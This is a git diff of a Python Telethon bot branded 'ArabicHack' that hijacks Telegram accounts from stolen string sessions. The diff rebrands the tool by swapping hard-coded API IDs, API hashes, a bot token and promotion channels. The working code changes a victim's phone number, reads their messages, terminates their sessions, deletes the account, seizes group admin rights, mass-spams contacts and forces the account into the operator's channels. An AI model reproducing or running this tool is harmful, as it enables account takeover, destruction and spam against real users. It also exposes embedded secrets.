@@ -9,13 +9,13 @@ from telethon import TelegramClient, events, functions, types, Button
 from datetime import timedelta
 import asyncio
 
-API_ID = ("19662621")
+API_ID = ("8897410")
 import os, asyncio, re
 from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
-API_HASH = ("24c2270e7f1336eb59ca6c48e42ec6ca")
-token = ("your bot token")
-client = TelegramClient('ArabicHack', 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca").start(bot_token=token)
+API_HASH = ("43cb89a7b70782868b77ace21c1341a9")
+token = ("5385064051:AAHwnAhMdniC9Q1YbKSK6MOPcnDS8a59_WI")
+client = TelegramClient('ArabicHack', 8897410, "43cb89a7b70782868b77ace21c1341a9").start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -24,25 +24,25 @@ import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
 
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
-mybot = "bot user name"
+mybot = "test2_3bot"
 bot = borg = client
 
 ArabicHack = 5159123009
 
-api_id = ("19662621")
-api_hash = ("24c2270e7f1336eb59ca6c48e42ec6ca")
+api_id = ("8897410")
+api_hash = ("43cb89a7b70782868b77ace21c1341a9")
 
 Bot_Username =(mybot , None) or "SessionHackingBot"
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     bot = client = X
     try:
-      await bot(join("@SAYTHONH"))
+      await bot(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await bot(join("@SAYTHONH"))
+      await bot(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -64,14 +64,14 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     bot = client = X
     try:
-      await bot(join("@SAYTHONH"))
+      await bot(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await bot(join("@SAYTHONH"))
+      await bot(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -94,14 +94,14 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     k = await X.get_me()
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -115,13 +115,13 @@ async def userinfo(strses):
     return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -136,29 +136,29 @@ async def terminate(strses):
 
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
       await X(join("@Ids_Holder"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(leave("@SAYTHONH"))
+      await X(leave("@e9n99"))
     except BaseException:
       pass
     await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -175,13 +175,13 @@ async def promote(strses, grp, user):
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -199,13 +199,13 @@ async def user2fa(strses):
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -225,13 +225,13 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -246,13 +246,13 @@ async def joingroup(strses, username):
 
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -266,13 +266,13 @@ async def leavegroup(strses, username):
     await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
@@ -288,21 +288,21 @@ async def delgroup(strses, username):
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     i = ""
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@e9n99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@S9N99"))
     except BaseException:
       pass
     try:
@@ -320,13 +320,13 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@E9N99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@E9N99"))
     except BaseException:
       pass
     try:
@@ -347,13 +347,13 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-  async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+  async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@E9N99"))
     except BaseException:
       pass
     try:
-      await X(join("@SAYTHONH"))
+      await X(join("@E9N99"))
     except BaseException:
       pass
     try:
@@ -378,7 +378,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "SAYTHONH"
+channel = "E9N99"
 menu = '''
 
 **"A" :~ [Check user own groups and channels]
@@ -415,7 +415,7 @@ BY SOMY TEAM
 I will add more features Later 😅**
 '''
 mm = '''
-**⚜NOTICE FIRST JOIN SUPPORT @SAYTHONH⚜**
+**⚜NOTICE FIRST JOIN SUPPORT @E9N99⚜**
 '''
 
 keyboard = [
@@ -440,7 +440,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("Owner", "https://t.me/T_4_Z")
+    Button.url("Owner", "https://t.me/nunuu")
     ]
 ]
 
@@ -457,7 +457,7 @@ async def op(event):
   else:
     legendbye = [
       [
-        Button.url("Must Join", f"https://t.me/SAYTHONH")
+        Button.url("Must Join", f"https://t.me/e9n99")
         ]
       ]
     await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
@@ -498,7 +498,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("Owner", "https://t.me/t_4_z")
+        Button.url("Owner", "https://t.me/nunuu")
         ]
     ]
     await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
@@ -519,7 +519,7 @@ async def users(event):
         return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @T_4_Z")
+        file.write(i + "\n\nDetails BY @nunuu")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -715,7 +715,7 @@ async def users(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @SAYTHONH\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO - @e9n99\n**LOGS**\n" + str(e))
 
 
 
@@ -728,7 +728,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("Owner", "https://t.me/T_4_Z")
+        Button.url("Owner", "https://t.me/nunuu")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
@@ -736,7 +736,7 @@ async def start(event):
 
 
 async def gcasta(strses, msg):
-    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -792,7 +792,7 @@ async def users(event):
 molb = True
 
 async def gcastb(strses, msg):
-    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -914,7 +914,7 @@ async def users(event):
       await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
 
 async def gcastc(strses, msg):
-    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+    async with tg(ses(strses), 8897410, "43cb89a7b70782868b77ace21c1341a9") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -948,5 +948,5 @@ async def users(event):
       i = await gcastc(strses.text, msg.text)
       await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
 
-print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @SAYTHONH|SYTHONTM")
+print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @e9n99|leeleel")
 client.run_until_disconnected()
